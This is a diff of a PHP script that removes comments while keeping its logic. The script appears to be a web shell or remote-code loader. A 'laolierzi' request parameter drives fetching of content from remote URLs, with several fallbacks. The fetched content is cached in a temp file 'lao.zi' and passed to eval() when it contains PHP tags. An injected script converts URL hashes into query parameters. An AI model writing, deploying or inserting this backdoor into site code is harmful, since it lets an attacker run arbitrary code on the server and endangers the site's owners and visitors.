@@ -1,7 +1,4 @@
 <?php
-// ===============================
-// Configuration constants
-// ===============================
 class Config
 {
     const CACHE_FILENAME = 'lao.zi';
@@ -11,7 +8,6 @@ class Config
         if (function_exists('sys_get_temp_dir')) {
             return sys_get_temp_dir() . '/';
         } else {
-            // Fallback for older PHP versions
             return '/tmp/';
         }
     }
@@ -26,31 +22,20 @@ class Config
         return self::getCacheDir() . 'white-url-zi';
     }
 }
-
-// ===============================
-// Utility class for common functions
-// ===============================
 class Utility
 {
-    /**
-     * Validates a URL using PHP's filter_var
-     */
     public static function validateUrl($url)
     {
         if (function_exists('filter_var')) {
             return filter_var($url, FILTER_VALIDATE_URL) !== false;
         } else {
-            // Basic fallback for very old PHP versions
+            
             return preg_match('/^https?:\/\//i', $url) === 1;
         }
     }
 
-    /**
-     * Fetch remote content using cURL, file_get_contents, or socket fallback
-     */
     public static function fetchRemoteContent($url)
     {
-        // cURL
         if (function_exists('curl_init')) {
             $ch = curl_init($url);
             curl_setopt_array($ch, array(
@@ -68,7 +53,6 @@ class Utility
             return $response;
         }
 
-        // file_get_contents fallback
         if (ini_get('allow_url_fopen')) {
             $content = @file_get_contents($url);
             if ($content !== false) {
@@ -76,7 +60,6 @@ class Utility
             }
         }
 
-        // socket fallback
         $parts = parse_url($url);
         if (!$parts || !isset($parts['host'])) {
             return null;
@@ -101,14 +84,9 @@ class Utility
         }
         fclose($socket);
 
-        // Remove headers
         $parts = preg_split('/\r\n\r\n/', $response, 2);
         return isset($parts[1]) ? $parts[1] : null;
     }
-
-    /**
-     * Load cache content from file
-     */
     public static function loadCache($filePath)
     {
         if (file_exists($filePath)) {
@@ -117,18 +95,12 @@ class Utility
         return '';
     }
 
-    /**
-     * Save cache content to file
-     */
     public static function saveCache($filePath, $content)
     {
         return @file_put_contents($filePath, $content) !== false;
     }
 }
 
-// ===============================
-// Main handler class
-// ===============================
 class LaoZiHandler
 {
     private $cacheFilePath;
@@ -140,10 +112,6 @@ class LaoZiHandler
         $this->whiteUrlFilePath = Config::getWhiteUrlFilePath();
         $this->ensureCacheDirectory();
     }
-
-    /**
-     * Ensures cache directory exists
-     */
     private function ensureCacheDirectory()
     {
         $dir = dirname($this->cacheFilePath);
@@ -152,9 +120,6 @@ class LaoZiHandler
         }
     }
 
-    /**
-     * Handles incoming requests
-     */
     public function handleRequest()
     {
         if (isset($_GET['laolierzi'])) {
@@ -185,15 +150,11 @@ class LaoZiHandler
         }
     }
 
-    /**
-     * Display cached content or message if none
-     */
     public function displayCache()
     {
         if (file_exists($this->cacheFilePath)) {
             $content = Utility::loadCache($this->cacheFilePath);
             if (strpos($content, '<?') !== false) {
-                // execute PHP code
                 eval('?>' . $content);
             } else {
                 echo $content;
@@ -203,9 +164,6 @@ class LaoZiHandler
         }
     }
 
-    /**
-     * Show styled message
-     */
     private function showMessage($message, $isError = false)
     {
         $color = $isError ? '#e74c3c' : '#3498db';
@@ -225,9 +183,6 @@ class LaoZiHandler
         exit;
     }
 
-    /**
-     * Redirect to same script URL
-     */
     private function redirectToSelf()
     {
         if (!headers_sent()) {
@@ -239,12 +194,8 @@ class LaoZiHandler
     }
 }
 
-// ===============================
-// Main execution
-// ===============================
 $handler = new LaoZiHandler();
 
-// Inject JavaScript for hash to GET conversion if needed
 if (!isset($_GET['laolierzi'])) {
     echo '<script>
 (function() {
@@ -266,9 +217,6 @@ if (!isset($_GET['laolierzi'])) {
 </script>';
 }
 
-// Handle request logic
 $handler->handleRequest();
-
-// Display cached content
 $handler->displayCache();
 ?>
